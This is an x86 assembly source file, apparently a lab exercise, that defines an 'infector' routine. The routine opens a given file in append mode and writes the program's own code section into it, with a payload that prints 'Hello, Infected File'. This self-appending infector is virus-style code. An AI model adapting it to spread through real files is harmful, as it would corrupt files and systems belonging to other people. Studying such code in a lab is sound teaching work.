section .text
    global _start
    global system_call
    global infection
    global infector
    global code_start
    global code_end
    extern main

_start:
    pop    dword ecx
    mov    esi,esp
    mov     eax,ecx
    shl     eax,2
    add     eax,esi
    add     eax,4
    push    dword eax
    push    dword esi
    push    dword ecx

    call    main

    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop

system_call:
    push    ebp
    mov     ebp, esp
    sub     esp, 4
    pushad

    mov     eax, [ebp+8]
    mov     ebx, [ebp+12]
    mov     ecx, [ebp+16]
    mov     edx, [ebp+20]
    int     0x80
    mov     [ebp-4], eax
    popad
    mov     eax, [ebp-4]
    add     esp, 4
    pop     ebp
    ret

code_start:

infection:
    push ebp
    mov ebp, esp
    pushad

    mov eax, 4
    mov ebx, 1
    mov ecx, msg
    mov edx, msg_len
    int 0x80

    popad
    pop ebp
    ret

infector:
    push ebp
    mov ebp, esp
    push ebx
    push ecx
    push edx
    push esi

    mov eax, 5
    mov ebx, [ebp+8]
    mov ecx, 1025
    mov edx, 420
    int 0x80

    cmp eax, 0
    jl .infector_fail

    mov esi, eax
    mov ebx, eax
    mov eax, 4
    mov ecx, code_start
    mov edx, code_end
    sub edx, code_start
    int 0x80

    mov eax, 6
    mov ebx, esi
    int 0x80

    mov eax, 0

.infector_done:
    pop esi
    pop edx
    pop ecx
    pop ebx
    pop ebp
    ret

.infector_fail:
    mov eax, -1
    jmp .infector_done

code_end:

section .data
    msg db "Hello, Infected File", 10
    msg_len equ $ - msg
